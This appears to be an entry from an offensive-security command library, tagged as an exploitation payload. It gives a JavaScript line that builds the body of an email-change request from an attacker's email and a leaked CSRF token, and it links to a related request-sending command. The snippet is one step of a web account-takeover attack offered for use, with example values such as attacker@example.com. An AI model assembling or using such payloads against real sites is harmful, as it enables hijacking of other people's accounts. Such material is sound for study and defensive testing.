---
data: >-
  var body = '_method=PUT&email=' + encodeURIComponent(change_email_to) +
  '&authenticity_token=' + encodeURIComponent(csrf);
tags:
  - exploitation
  - payload
type: command
output: String body for request
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.424Z'
id: d7a45b8f-b99b-448c-8345-4963fc79c5c9
verified: false
validated: true
submitted: true
---
# js-build-email-body

## Command

```javascript
var body = '_method=PUT&email=' + encodeURIComponent(change_email_to) + '&authenticity_token=' + encodeURIComponent(csrf);
```

## Description

Constructs the form-encoded body for the email change request using extracted values.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| change_email_to | Attacker's email | Yes |
| csrf | Leaked token | Yes |
| _method | 'PUT' for update | Yes |

## Examples

### Basic Usage

```javascript
var body = '_method=PUT&email=attacker@example.com&authenticity_token=token123';
```

### Advanced Usage

```javascript
encodeURIComponent('special@chars.com');
```

## Expected Output

URL-encoded string ready for send.

## Related

- [[commands/js-send-blob-request]]
